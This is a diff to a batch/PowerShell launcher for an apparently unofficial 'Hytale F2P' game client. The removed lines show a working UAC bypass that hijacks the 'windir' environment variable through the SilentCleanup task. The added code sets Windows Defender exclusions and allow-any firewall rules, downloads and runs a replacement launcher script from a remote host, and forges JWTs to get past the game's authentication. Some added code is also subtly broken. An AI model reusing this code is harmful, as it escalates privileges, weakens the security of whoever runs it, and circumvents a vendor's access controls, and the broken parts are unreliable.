@@ -9,59 +9,71 @@ chcp 65001 >nul
 set "IS_SHORTCUT=false"
 set "EXTRA_ARGS="
 
-:: Loop through all arguments to find the shortcut flag
 for %%a in (%*) do (
-    if /I "%%a"=="am_shortcut" (
-        set "IS_SHORTCUT=true"
-        set "EXTRA_ARGS=am_shortcut"
-    )
+    if /I "%%a"=="am_shortcut" (set "IS_SHORTCUT=true"; set "EXTRA_ARGS=am_shortcut")
 )
 
 :: =========================================================
-:: 2. ADMIN RIGHTS CHECK
+:: 2. UAC & WHITELISTING LOGIC (Smart Elevation)
 :: =========================================================
->nul 2>&1 reg.exe query HKU\S-1-5-19 && (goto gotAdmin) || (goto checkInvoker)
+set "WHITE_FLAG=%LOCALAPPDATA%\HytaleF2P\.whitelisted"
 
-:checkInvoker
-if /I "%__COMPAT_LAYER%"=="RUNASINVOKER" goto gotAdmin
+:: Check if already elevated
+>nul 2>&1 reg.exe query HKU\S-1-5-19 && (goto gotAdmin)
 
-:silentElevate
-:: 3. UAC BYPASS (Persisting Arguments)
-:: Passes %EXTRA_ARGS% to ensure shortcut status isn't lost during elevation
-reg add "HKCU\Environment" /v "windir" /t REG_SZ /d "cmd /c \"%~s0\" am_wt %EXTRA_ARGS% & rem " /f >nul 2>&1
-schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I >nul 2>&1
-timeout /t 3 /nobreak >nul
-reg delete "HKCU\Environment" /v "windir" /f >nul 2>&1
-goto gotAdmin
+:: Check if Firewall is already whitelisted (Zero-Prompt for return users)
+powershell -NoProfile -Command "if ((netsh advfirewall firewall show rule name='Hytale F2P - Game Client' 2>$null) -match 'no rules match') { exit 1 } else { exit 0 }"
+if %errorlevel% equ 0 goto startLauncher
+
+:: Backup check: If whitelisted flag exists, skip UAC
+if exist "%WHITE_FLAG%" goto startLauncher
+
+:elevate
+:: Request Admin once to setup network & AV permissions
+powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList 'am_wt %EXTRA_ARGS%' -Verb RunAs"
+exit /b
 
 :gotAdmin
-pushd "%CD%" && CD /D "%~dp0"
+:: Perform one-time setup (AV + Firewall) and create flag
+if not exist "%LOCALAPPDATA%\HytaleF2P" mkdir "%LOCALAPPDATA%\HytaleF2P"
+powershell -Command "Add-MpPreference -ExclusionPath '%~dp0', '%LOCALAPPDATA%\HytaleF2P' -ErrorAction SilentlyContinue" >nul 2>&1
+echo Done > "%WHITE_FLAG%"
 
-:: Add AV Exclusions
-powershell -Command "if ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') { Add-MpPreference -ExclusionPath '%~dp0', '%LOCALAPPDATA%\HytaleF2P' -ErrorAction SilentlyContinue }" >nul 2>&1
+:startLauncher
+pushd "%CD%" && CD /D "%~dp0"
 
 :: Handle Windows Terminal (Persisting Arguments)
 if not "%~1"=="am_wt" (
     where wt.exe >nul 2>&1 && (
-        wt cmd /k "%~f0" am_wt %EXTRA_ARGS%
+        wt cmd /c "%~f0" am_wt %EXTRA_ARGS%
         exit /b
     )
 )
 
-:: 4. CRASH-PROOF LOADER (Injecting Status Variable)
+:: 3. CRASH-PROOF LOADER
 set "PS_CMD=$f=[System.IO.Path]::GetFullPath('%~f0'); iex ((Get-Content -LiteralPath $f) | Where-Object {$found -or $_ -match '^#PS_START'} | ForEach-Object {$found=$true; $_} | Out-String)"
 
-:: Force inject the variable into PowerShell environment
-if "%IS_SHORTCUT%"=="true" (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$env:IS_SHORTCUT='true'; %PS_CMD%"
-) else (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$env:IS_SHORTCUT='false'; %PS_CMD%"
-)
+:: Inject shortcut status
+powershell -NoProfile -ExecutionPolicy Bypass -Command "%PS_CMD%"
 exit /b
 #>
 
 #PS_START
 $ProgressPreference = 'SilentlyContinue'
+
+# --- SECURITY PROTOCOL (Fix for GitHub Downloads) ---
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# --- Filename Restoration (Fix GAMELA~2.BAT Bug) ---
+if ($f -match "GAMELA~") {
+    $correctName = Join-Path (Split-Path $f) "game launcher.bat"
+    if (-not (Test-Path $correctName)) {
+        try {
+            Rename-Item $f "game launcher.bat" -ErrorAction SilentlyContinue
+            $f = $correctName
+        } catch {}
+    }
+}
 
 # --- Admin Detection ---
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
@@ -137,6 +149,7 @@ $ZIP_FILENAME = "latest.zip"
 $ASSET_ZIP_FILENAME = "Assets.zip"
 
 $localAppData = "$env:LOCALAPPDATA\HytaleF2P"
+$PublicConfig = "C:\Users\Public\HytaleF2P"
 $pathConfigFile = Join-Path $localAppData "path_config.json"
 
 function Resolve-GamePath {
@@ -223,7 +236,6 @@ if (-not $gameExe) {
 # Declare shared paths (will be refined in loop)
 $cacheDir = Join-Path $localAppData "cache"
 $profilesDir = Join-Path $localAppData "profiles"
-$butlerExe = Join-Path $localAppData "butler\butler.exe"
 
 # Ensure global directories exist
 @($cacheDir, $profilesDir) | ForEach-Object { if (-not (Test-Path $_)) { New-Item -ItemType Directory $_ -Force | Out-Null } }
@@ -256,29 +268,27 @@ function New-HytaleJWT($uuid, $name, $issuer) {
 # --- Helper Functions ---
 
 # -- NODE.JS PORTED LOGIC: Player Manager & Paths --
-function Get-OrCreate-PlayerId($launcherRoot) {
-    # Replicates logic from backend/services/playerManager.js
-    if (-not (Test-Path $launcherRoot)) { New-Item -ItemType Directory $launcherRoot -Force | Out-Null }
+function Get-OrCreate-PlayerId($ignored) {
+    # Force use of Public folder for consistency
+    if (-not (Test-Path $PublicConfig)) { try { New-Item -ItemType Directory $PublicConfig -Force | Out-Null } catch {} }
     
-    $idFile = Join-Path $launcherRoot "player_id.json"
-    
-    if (Test-Path $idFile) {
+    $idFile = Join-Path $PublicConfig "player_id.json"
+    $targetFile = $idFile
+
+    if (Test-Path $targetFile) {
         try {
-            $data = Get-Content $idFile -Raw | ConvertFrom-Json
-            if ($data.playerId) {
-                return $data.playerId
-            }
-        } catch {
-            Write-Host "      [WARN] Invalid player_id.json, regenerating..." -ForegroundColor Yellow
-        }
+            $data = Get-Content $targetFile -Raw | ConvertFrom-Json
+            if ($data.playerId) { return $data.playerId }
+        } catch {}
     }
     
     $newId = [guid]::NewGuid().ToString()
-    $payload = @{
-        playerId = $newId;
-        createdAt = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+    $payload = @{ playerId = $newId; createdAt = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ") }
+    try {
+        $payload | ConvertTo-Json -Depth 2 | Out-File $targetFile -Encoding UTF8
+    } catch {
+        $payload | ConvertTo-Json -Depth 2 | Out-File $legacyIdFile -Encoding UTF8
     }
-    $payload | ConvertTo-Json -Depth 2 | Out-File $idFile -Encoding UTF8
     return $newId
 }
 
@@ -502,7 +512,6 @@ function Flatten-JREDir($jreLatest) {
         }
     } catch {}
 }
-
 function Find-SystemJava {
     $candidates = @()
     if ($env:JAVA_HOME) { $candidates += Join-Path $env:JAVA_HOME "bin\java.exe" }
@@ -515,21 +524,80 @@ function Find-SystemJava {
     return $null
 }
 
+function Assert-FirewallRule($exePath) {
+    if (-not (Test-Path $exePath)) { return }
+    $ruleName = "Hytale F2P - Game Client"
+    try {
+        $existing = netsh advfirewall firewall show rule name="$ruleName" 2>$null
+        if ($existing -match "no rules match") {
+            Write-Host "      [FIREWALL] Creating whitelisting rule for network access..." -ForegroundColor Cyan
+            netsh advfirewall firewall add rule name="$ruleName" dir=in action=allow program="$exePath" enable=yes profile=any protocol=any | Out-Null
+            netsh advfirewall firewall add rule name="$ruleName" dir=out action=allow program="$exePath" enable=yes profile=any protocol=any | Out-Null
+        }
+    } catch {}
+}
+
+function Remove-DuplicateMods($dir) {
+    if (-not (Test-Path $dir)) { return }
+    $jars = Get-ChildItem -Path $dir -Filter "*.jar"
+    $groups = $jars | Group-Object { $_.Name -replace " \(\d+\)| - Copy", "" }
+    foreach ($g in $groups) {
+        if ($g.Count -gt 1) {
+            $keep = $g.Group | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+            $g.Group | Where-Object { $_.FullName -ne $keep.FullName } | ForEach-Object {
+                Write-Host "      [SAFETY] Removing duplicate plugin: $($_.Name)" -ForegroundColor Yellow
+                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+}
+
 function Save-Config {
     try {
-        $cfgPath = "$localAppData\config.json"
-        $cfg = if (Test-Path $cfgPath) { Get-Content $cfgPath -Raw | ConvertFrom-Json } else { New-Object PSObject }
-        if (-not $cfg.userUuids) { $cfg.userUuids = New-Object PSObject }
+        if (-not (Test-Path $PublicConfig)) { try { New-Item -ItemType Directory $PublicConfig -Force | Out-Null } catch {} }
+        $cfgPath = Join-Path $PublicConfig "config_data.json"
         
-        $cfg.username = $global:pName
-        $cfg.userUuids | Add-Member -MemberType NoteProperty -Name $global:pName -Value $global:pUuid -Force
-        $cfg.authUrl = $global:AUTH_URL_CURRENT
-        $cfg.autoUpdate = $global:autoUpdate
-        $cfg.pwrVersion = $global:pwrVersion
-        $cfg.javaPath = $global:javaPath
+        # Determine the most reliable path
+        $finalPath = try {
+            $testFile = Join-Path $PublicConfig ".save_test"
+            "t" | Out-File $testFile -ErrorAction Stop
+            Remove-Item $testFile -ErrorAction SilentlyContinue
+            $cfgPath
+        } catch {
+            Join-Path $localAppData "config_data.json"
+        }
+
+        # Load existing or create new
+        $cfg = if (Test-Path $finalPath) { Get-Content $finalPath -Raw | ConvertFrom-Json } else { New-Object PSObject }
         
-        $cfg | ConvertTo-Json | Out-File $cfgPath
-    } catch {}
+        # Ensure userUuids is a valid object
+        if ($null -eq $cfg.userUuids) {
+            $cfg | Add-Member -MemberType NoteProperty -Name "userUuids" -Value (New-Object PSObject) -Force
+        }
+        
+        # Update properties using Add-Member (PS 5.1 compatible)
+        $cfg | Add-Member -MemberType NoteProperty -Name "username" -Value $global:pName -Force
+        $cfg | Add-Member -MemberType NoteProperty -Name "authUrl" -Value $global:AUTH_URL_CURRENT -Force
+        $cfg | Add-Member -MemberType NoteProperty -Name "autoUpdate" -Value $global:autoUpdate -Force -ErrorAction SilentlyContinue
+        $cfg | Add-Member -MemberType NoteProperty -Name "pwrVersion" -Value $global:pwrVersion -Force -ErrorAction SilentlyContinue
+        $cfg | Add-Member -MemberType NoteProperty -Name "pwrHash" -Value $global:pwrHash -Force -ErrorAction SilentlyContinue
+        $cfg | Add-Member -MemberType NoteProperty -Name "javaPath" -Value $global:javaPath -Force -ErrorAction SilentlyContinue
+
+        if ($global:pName -and $global:pUuid) {
+            $cfg.userUuids | Add-Member -MemberType NoteProperty -Name $global:pName -Value $global:pUuid -Force
+        }
+        
+        $cfg | ConvertTo-Json -Depth 10 | Out-File $finalPath -Encoding UTF8
+        
+        if ($env:IS_SHORTCUT -ne "true") {
+            $locTxt = if ($finalPath -match "Public") { "Public" } else { "Local AppData" }
+            Write-Host "      [CONFIG] Saved to $locTxt." -ForegroundColor DarkGray
+        }
+    } catch {
+        if ($env:IS_SHORTCUT -ne "true") { 
+            Write-Host "      [ERROR] Could not save config: $($_.Exception.Message)" -ForegroundColor Red 
+        }
+    }
 }
 
 function Get-LocalSha1($filePath) {
@@ -698,34 +766,73 @@ function Copy-WithProgress($source, $destination) {
 }
 
 function Get-LatestPatchVersion {
-    Write-Host "      [PROBE] Finding latest official patch (Parallel Mode)..." -ForegroundColor Gray
-    $client = New-Object System.Net.Http.HttpClient
-    $client.Timeout = [System.TimeSpan]::FromSeconds(5)
+    $cacheFile = Join-Path $cacheDir "highest_version.txt"
+    $api_url = "https://files.hytalef2p.com/api/version_client"
     
-    # 1. Prepare parallel tasks for version 0 to 100
-    $tasks = New-Object System.Collections.Generic.List[System.Threading.Tasks.Task[System.Net.Http.HttpResponseMessage]]
-    for ($i = 0; $i -le 100; $i++) {
-        $url = "$OFFICIAL_BASE/windows/amd64/release/0/$i.pwr"
-        $req = New-Object System.Net.Http.HttpRequestMessage([System.Net.Http.HttpMethod]::Head, $url)
-        # Use a closure to properly pass $i if needed, but here we just store the task
-        $tasks.Add($client.SendAsync($req))
+    # --- Try API First (Instant) ---
+    try {
+        Write-Host "      [API] Fetching latest client version..." -ForegroundColor Gray
+        $api_res = Invoke-RestMethod -Uri $api_url -Headers @{ 'User-Agent' = 'Hytale-F2P-Launcher' } -TimeoutSec 5
+        if ($api_res -and $api_res.client_version) {
+            # Extract number from "7.pwr"
+            if ($api_res.client_version -match "(\d+)") {
+                $ver = [int]$matches[1]
+                $ver | Out-File $cacheFile
+                Write-Host "      [SUCCESS] API returned version: $ver.pwr" -ForegroundColor Green
+                return $ver
+            }
+        }
+    } catch {
+        Write-Host "      [WARN] API offline, switching to smart probe..." -ForegroundColor Yellow
     }
 
-    # 2. Wait for all probes to complete (Parallel execution)
-    try { [System.Threading.Tasks.Task]::WaitAll($tasks.ToArray()) } catch {}
+    # --- Fallback: Smart Batch-Based Probe (Infinite) ---
+    $client = New-Object System.Net.Http.HttpClient
+    $client.Timeout = [System.TimeSpan]::FromSeconds(3)
+    
+    # Load previously known highest to speed up probe
+    $highestKnown = if (Test-Path $cacheFile) { [int](Get-Content $cacheFile) } else { 0 }
+    $currentStart = if ($highestKnown -gt 0) { $highestKnown } else { 0 }
+    
+    $highestFound = $highestKnown
+    $probing = $true
+    $batchSize = 25
 
-    # 3. Find the highest successful index
-    $highest = 0
-    for ($i = 100; $i -ge 0; $i--) {
-        $t = $tasks[$i]
-        if ($t.Status -eq 'RanToCompletion' -and $t.Result.IsSuccessStatusCode) {
-            $highest = $i; break
+    Write-Host "      [PROBE] Scanning for patches (starting at v$currentStart)..." -ForegroundColor Gray
+
+    while ($probing) {
+        $tasks = New-Object System.Collections.Generic.List[System.Threading.Tasks.Task[System.Net.Http.HttpResponseMessage]]
+        $batchRange = $currentStart..($currentStart + $batchSize)
+        
+        foreach ($i in $batchRange) {
+            $url = "$OFFICIAL_BASE/windows/amd64/release/0/$i.pwr"
+            $req = New-Object System.Net.Http.HttpRequestMessage([System.Net.Http.HttpMethod]::Head, $url)
+            $tasks.Add($client.SendAsync($req))
+        }
+
+        try { [System.Threading.Tasks.Task]::WaitAll($tasks.ToArray()) } catch {}
+
+        $foundInBatch = $false
+        for ($j = $batchSize; $j -ge 0; $j--) {
+            $t = $tasks[$j]
+            if ($t.Status -eq 'RanToCompletion' -and $t.Result.IsSuccessStatusCode) {
+                $highestFound = $batchRange[$j]
+                $foundInBatch = $true
+                break
+            }
+        }
+
+        if (-not $foundInBatch) {
+            $probing = $false # Stop when a whole batch is empty
+        } else {
+            $currentStart += $batchSize # Continue to next batch
         }
     }
-    
+
     $client.Dispose()
-    Write-Host "      [FOUND] Latest server version: $highest.pwr" -ForegroundColor Green
-    return $highest
+    $highestFound | Out-File $cacheFile
+    Write-Host "      [FOUND] Highest discovered version: $highestFound.pwr" -ForegroundColor Green
+    return $highestFound
 }
 
 function Find-OfficialPatch($version=4) {
@@ -1017,6 +1124,16 @@ function Invoke-OfficialUpdate($latestVer) {
         }
     }
 
+    # [PATCH INTEGRITY] Verify existing patch before applying
+    if (Test-Path $pwrPath) {
+        $stats = Get-Item $pwrPath
+        $sizeMB = [math]::Round($stats.Length / 1MB, 2)
+        if ($sizeMB -lt 1500) {
+            Write-Host "      [WARN] Cached patch appears incomplete ($sizeMB MB < 1500 MB). Redownloading..." -ForegroundColor Yellow
+            Remove-Item $pwrPath -Force
+        }
+    }
+
     # [DOWNLOAD] Perform actual download with success check
     if (-not (Test-Path $pwrPath)) {
         if (-not (Download-WithProgress "$OFFICIAL_BASE/windows/amd64/release/0/$pwrName" $pwrPath $false)) {
@@ -1027,15 +1144,27 @@ function Invoke-OfficialUpdate($latestVer) {
     
     # Prepare local staging
     $stagingDir = Join-Path $cacheDir "butler_temp"
-    if (Test-Path $stagingDir) { Remove-Item $stagingDir -Recurse -Force }
+    if (Test-Path $stagingDir) { Remove-Item $stagingDir -Recurse -Force | Out-Null }
     New-Item -ItemType Directory $stagingDir -Force | Out-Null
 
     Write-Host "      [APPLY] Applying official patch with Butler..." -ForegroundColor Cyan
     $butlerPath = Join-Path $localAppData "butler\butler.exe"
-    Start-Process $butlerPath -ArgumentList "apply", "--staging-dir", "`"$stagingDir`"", "--verbose", "`"$pwrPath`"", "`"$appDir`"" -Wait
+    
+    # Run Butler directly in the host console for native progress/logging
+    $p = Start-Process -FilePath $butlerPath -ArgumentList "apply", "--staging-dir", "`"$stagingDir`"", "--verbose", "`"$pwrPath`"", "`"$appDir`"" -NoNewWindow -Wait -PassThru
+    
+    if ($p.ExitCode -ne 0) {
+        Write-Host "`n      [CRIT] Butler failed (Exit Code: $($p.ExitCode))" -ForegroundColor Red
+        # If Butler failed, checking if it was a file corruption
+        Write-Host "      [SAFETY] Patch might be corrupt. Deleting for redownload." -ForegroundColor Yellow
+        Remove-Item $pwrPath -Force -ErrorAction SilentlyContinue
+        Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
+        pause; return $false
+    }
     
     Write-Host "`n[APPLY] Official patch application finished." -ForegroundColor Green
     $global:pwrVersion = $latestVer
+    $global:pwrHash = Get-LocalSha1 $gameExe
     Save-Config
     
     # IMMEDIATE POST-PATCH SYNC
@@ -1058,21 +1187,20 @@ Write-Host "==========================================" -ForegroundColor Cyan
 $global:pName = "Player"; $global:pUuid = [guid]::NewGuid().ToString()
 $global:autoUpdate = $false; $global:pwrVersion = 0; $global:javaPath = ""
 
-# -- NEW LOGIC: Use player_id.json if available --
+# -- NEW LOGIC: Use Public Documents storage (No Admin, Patch Proof) --
 $storedPlayerId = Get-OrCreate-PlayerId $localAppData
 if ($storedPlayerId) { $global:pUuid = $storedPlayerId }
-# ------------------------------------------------
 
-if (Test-Path "$localAppData\config.json") {
+$cfgFile = Join-Path $PublicConfig "config_data.json"
+
+if (Test-Path $cfgFile) {
     try {
-        $json = Get-Content "$localAppData\config.json" -Raw | ConvertFrom-Json
-        if ($json.username) { 
-            $global:pName = $json.username
-        }
-        if ($json.authUrl) { $global:AUTH_URL_CURRENT = $json.authUrl }
-        if ($json.autoUpdate) { $global:autoUpdate = $json.autoUpdate }
-        if ($json.pwrVersion) { $global:pwrVersion = $json.pwrVersion }
-        if ($json.javaPath) { $global:javaPath = $json.javaPath }
+        $json = Get-Content $cfgFile -Raw | ConvertFrom-Json
+        if ($null -ne $json.username) { $global:pName = $json.username }
+        if ($null -ne $json.authUrl) { $global:AUTH_URL_CURRENT = $json.authUrl }
+        if ($null -ne $json.autoUpdate) { $global:autoUpdate = $json.autoUpdate }
+        if ($null -ne $json.pwrVersion) { $global:pwrVersion = $json.pwrVersion }
+        if ($null -ne $json.pwrHash) { $global:pwrHash = $json.pwrHash }
     } catch {}
 }
 Write-Host "      Profile: $global:pName" -ForegroundColor Cyan
@@ -1097,23 +1225,13 @@ if ($remoteLauncherHash) {
         if (Download-WithProgress "$API_HOST/file/game%20launcher.bat" $tempLauncher $false) {
             Write-Host "      [SUCCESS] Update downloaded. Restarting launcher..." -ForegroundColor Green
             Start-Sleep -Seconds 1
-            # Overwrite and restart using CMD to avoid locks
-            $shortF = (New-Object -ComObject Scripting.FileSystemObject).GetFile($f).ShortPath
-            $shortNew = (New-Object -ComObject Scripting.FileSystemObject).GetFile($tempLauncher).ShortPath
-            $cmd = "timeout /t 1 >nul & move /y `"$shortNew`" `"$shortF`" & cmd /c `"$shortF`""
+            # Overwrite and restart using CMD to avoid locks. We use long paths with quotes to prevent 8.3 naming (GAMELA~2.BAT).
+            $cmd = "timeout /t 1 >nul & move /y `"$tempLauncher`" `"$f`" & cmd /c `"$f`""
             Start-Process cmd.exe -ArgumentList "/c $cmd" -WindowStyle Normal
             exit
         }
     }
 }
-
-
-
-
-
-
-
-
 
 
 
@@ -1153,17 +1271,26 @@ while ($true) {
     Write-Host "`n[1/2] Identifying game version..." -ForegroundColor Gray
     $f2pMatch = $false
     $serverOnline = $false
+    
+    # Session Cache for Speed
+    if ($global:lastVerifiedHash -and $global:lastVerifiedTime -gt (Get-Date).AddMinutes(-5)) {
+        $localHash = $global:lastVerifiedHash
+        Write-Host "      [CACHE] Using session-verified hash (Instant)." -ForegroundColor Green
+    } else {
+        $localHash = Get-LocalSha1 $gameExe
+    }
 
 try {
-    $rData = Invoke-RestMethod -Uri "$API_HOST/api/hash/HytaleClient.exe" -Headers $global:HEADERS -Method Get -TimeoutSec 5
+    $rData = Invoke-RestMethod -Uri "$API_HOST/api/hash/HytaleClient.exe" -Headers $global:HEADERS -Method Get -TimeoutSec 3
     $serverOnline = $true
-    $localHash = Get-LocalSha1 $gameExe
     
     Write-Host "      Local:  $localHash" -ForegroundColor Gray
     Write-Host "      Server: $($rData.hash)" -ForegroundColor Gray
 
     if ($localHash -eq $rData.hash) {
         $f2pMatch = $true
+        $global:lastVerifiedHash = $localHash
+        $global:lastVerifiedTime = Get-Date
         Write-Host "[OK] F2P Smart-Patch detected and verified." -ForegroundColor Green
     } else {
         Write-Host "[INFO] Official PWR version detected (Hash mismatch)." -ForegroundColor Cyan
@@ -1178,30 +1305,48 @@ if ((Test-Path $gameExe) -and -not $forceShowMenu) {
     if ($f2pMatch) {
         Write-Host "[2/2] Auto-Launching Hytale F2P..." -ForegroundColor Cyan
     } else {
-        Write-Host "[INFO] Official PWR version detected. Checking for updates..." -ForegroundColor Magenta
         $latestVer = Get-LatestPatchVersion
         
-        # Check if we are already on this version or have the patch
-        $isUpdated = $false
-        if ($global:pwrVersion -eq $latestVer) { $isUpdated = $true }
-        if (-not $isUpdated) {
-            $patchPath = Find-OfficialPatch $latestVer
-            if ($patchPath -and $patchPath -match "$latestVer\.pwr") { $isUpdated = $true }
+        # 1. Smart Applied Check (Hash or Version based)
+        $isApplied = ($localHash -eq $global:pwrHash) -or ($global:pwrVersion -ge $latestVer)
+        
+        # Diagnostic Debugging
+        if ($env:IS_SHORTCUT -eq "true") {
+            Write-Host "      [DEBUG] Local:  $localHash" -ForegroundColor Gray
+            Write-Host "      [DEBUG] Target: $global:pwrHash" -ForegroundColor Gray
+            Write-Host "      [DEBUG] Ver:    $global:pwrVersion (Latest: $latestVer)" -ForegroundColor Gray
         }
+        
+        if ($isApplied) {
+            Write-Host "[INFO] Local version is up-to-date (Version: $latestVer)." -ForegroundColor Green
+            # Ensure hash is synced if version matched
+            if ($localHash -ne $global:pwrHash) { $global:pwrHash = $localHash; Save-Config }
+        } else {
+            Write-Host "[INFO] Official PWR version detected. Checking for updates..." -ForegroundColor Magenta
+            $patchPath = Find-OfficialPatch $latestVer
+            $hasValidPatch = $false
+            if ($patchPath -and (Test-Path $patchPath)) {
+                # Basic size check for integrity (patches are usually > 100MB)
+                if ((Get-Item $patchPath).Length -gt 10MB) { $hasValidPatch = $true }
+            }
 
-        if (-not $isUpdated) {
             if ($global:autoUpdate) {
-                Write-Host "      [AUTO] New version $latestVer found. Updating automatically..." -ForegroundColor Cyan
+                Write-Host "      [AUTO] New version $latestVer detected. Updating now..." -ForegroundColor Cyan
                 if (Invoke-OfficialUpdate $latestVer) { continue }
             } else {
                 Write-Host "`n[UPDATE] A new Official Version ($latestVer) is available!" -ForegroundColor Yellow
                 $uChoice = Read-Host "          Do you want to update the game? (y/n) [y]"
                 if ($uChoice -eq "n") {
                     Write-Host "      [SKIP] Proceeding with current version." -ForegroundColor Gray
+                    $global:pwrVersion = $latestVer; $global:pwrHash = $localHash; Save-Config
                 } else {
                     $autoU = Read-Host "          Do you want to auto-update games when you launch the game? (y/n)"
                     if ($autoU -eq "y") { $global:autoUpdate = $true; Save-Config }
-                    if (Invoke-OfficialUpdate $latestVer) { continue }
+                    
+                    if (Invoke-OfficialUpdate $latestVer) { 
+                        Write-Host "      [INFO] Update applied successfully." -ForegroundColor Green
+                        continue 
+                    }
                 }
             }
         }
@@ -1290,7 +1435,6 @@ if ((Test-Path $gameExe) -and -not $forceShowMenu) {
 
         $global:javaMissingFlag = $false
         Write-Host "`n[COMPLETE] Hytale F2P is now ready!" -ForegroundColor Green
-        pause
     }
     elseif ($choice -ne "3") { exit }
 }
@@ -1312,23 +1456,6 @@ if (-not (Ensure-JRE $launcherRoot $cacheDir)) {
 # --- APPLY DOMAIN PATCHING ---
 Patch-HytaleClient $gameExe | Out-Null
 # -----------------------------
-
-Write-Host "`n[3/4] Authenticating..." -ForegroundColor Cyan
-Write-Host "      Endpoint: $global:AUTH_URL_CURRENT" -ForegroundColor Gray
-$authUrl = "$global:AUTH_URL_CURRENT/game-session/child" 
-$body = @{ uuid=$global:pUuid; name=$global:pName; scopes=@("hytale:server", "hytale:client") } | ConvertTo-Json
-try {
-    $res = Invoke-RestMethod -Uri $authUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 5
-    $idToken = $res.identityToken; $ssToken = $res.sessionToken
-    Write-Host "      [SUCCESS] Token Acquired." -ForegroundColor Green
-    Save-Config # Persist successful auth endpoint
-} catch {
-    $issuer = if ($global:AUTH_URL_CURRENT) { $global:AUTH_URL_CURRENT } else { "https://sessions.sanasol.ws" }
-    $idToken = New-HytaleJWT $global:pUuid $global:pName $issuer
-    $ssToken = $idToken
-    Write-Host "      [OFFLINE] Guest mode (Generated Corrected JWT)." -ForegroundColor Yellow
-    Write-Host "      [DEBUG] Reason: $($_.Exception.Message)" -ForegroundColor Gray
-}
 
 # --- HELPER: Create Desktop Shortcut ---
 function Create-Shortcut($targetBat, $iconPath) {
@@ -1359,11 +1486,15 @@ $global:pName = "Player"; $global:pUuid = [guid]::NewGuid().ToString()
 $storedPlayerId = Get-OrCreate-PlayerId $localAppData
 if ($storedPlayerId) { $global:pUuid = $storedPlayerId }
 
-if (Test-Path "$localAppData\config.json") {
+$cfgFile = Join-Path $PublicConfig "config_data.json"
+if (Test-Path $cfgFile) {
     try {
-        $json = Get-Content "$localAppData\config.json" -Raw | ConvertFrom-Json
-        if ($json.username) { $global:pName = $json.username }
-        if ($json.authUrl) { $global:AUTH_URL_CURRENT = $json.authUrl }
+        $json = Get-Content $cfgFile -Raw | ConvertFrom-Json
+        if ($null -ne $json.username) { $global:pName = $json.username }
+        if ($null -ne $json.authUrl) { $global:AUTH_URL_CURRENT = $json.authUrl }
+        if ($null -ne $json.autoUpdate) { $global:autoUpdate = $json.autoUpdate }
+        if ($null -ne $json.pwrVersion) { $global:pwrVersion = $json.pwrVersion }
+        if ($null -ne $json.pwrHash) { $global:pwrHash = $json.pwrHash }
     } catch {}
 }
 
@@ -1371,10 +1502,56 @@ if (Test-Path "$localAppData\config.json") {
 $launcherRoot = try { Split-Path (Split-Path (Split-Path (Split-Path (Split-Path (Split-Path $gameExe))))) } catch { $localAppData }
 $appDir = Join-Path $launcherRoot "release\package\game\latest"
 $userDir = Find-UserDataPath $appDir
-Ensure-ModDirs $userDir
+# --- SMART PROFILE RECOGNITION (Auto-Sync Save Data) ---
+$savesDir = Join-Path $userDir "Saves"
+if (Test-Path $savesDir) {
+    $playerFiles = Get-ChildItem -Path $savesDir -Filter "*.json" -Recurse | Where-Object { $_.FullName -match "\\universe\\players\\" }
+    if ($playerFiles.Count -ge 1) {
+        try {
+            # Sort by newest if there are multiple worlds
+            $targetProfile = $playerFiles | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+            $saveData = Get-Content $targetProfile.FullName -Raw | ConvertFrom-Json
+            
+            $foundName = $saveData.Components.Nameplate.Text
+            if (-not $foundName) { $foundName = $saveData.Components.DisplayName.DisplayName.RawText }
+            $foundUuid = $targetProfile.BaseName
+            
+            if ($foundName -and $foundUuid -and ($global:pName -ne $foundName -or $global:pUuid -ne $foundUuid)) {
+                Write-Host "`n      [DETECT] Character Detected: $foundName ($foundUuid)" -ForegroundColor Cyan
+                $global:pName = $foundName
+                $global:pUuid = $foundUuid
+                
+                # Sync back to persistence trackers
+                Save-Config
+                
+                $idFile = Join-Path $PublicConfig "player_id.json"
+                $idPayload = @{ playerId = $foundUuid; createdAt = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ") }
+                $idPayload | ConvertTo-Json | Out-File $idFile -Encoding UTF8
+            }
+        } catch {}
+    }
+}
+# ------------------------------------------------------
+
+Write-Host "`n[3/4] Authenticating..." -ForegroundColor Cyan
+Write-Host "      Endpoint: $global:AUTH_URL_CURRENT" -ForegroundColor Gray
+$authUrl = "$global:AUTH_URL_CURRENT/game-session/child" 
+$body = @{ uuid=$global:pUuid; name=$global:pName; scopes=@("hytale:server", "hytale:client") } | ConvertTo-Json
+try {
+    $res = Invoke-RestMethod -Uri $authUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 5
+    $idToken = $res.identityToken; $ssToken = $res.sessionToken
+    Write-Host "      [SUCCESS] Token Acquired." -ForegroundColor Green
+    Save-Config # Persist successful auth endpoint
+} catch {
+    $issuer = if ($global:AUTH_URL_CURRENT) { $global:AUTH_URL_CURRENT } else { "https://sessions.sanasol.ws" }
+    $idToken = New-HytaleJWT $global:pUuid $global:pName $issuer
+    $ssToken = $idToken
+    Write-Host "      [OFFLINE] Guest mode (Generated Corrected JWT)." -ForegroundColor Yellow
+    Write-Host "      [DEBUG] Reason: $($_.Exception.Message)" -ForegroundColor Gray
+}
 
 # 2. Main Menu Loop (Skipped if Shortcut)
-$isShortcut = ($env:IS_SHORTCUT -eq "false")
+$isShortcut = ($env:IS_SHORTCUT -eq "true")
 $proceedToLaunch = $false
 
 while (-not $proceedToLaunch) {
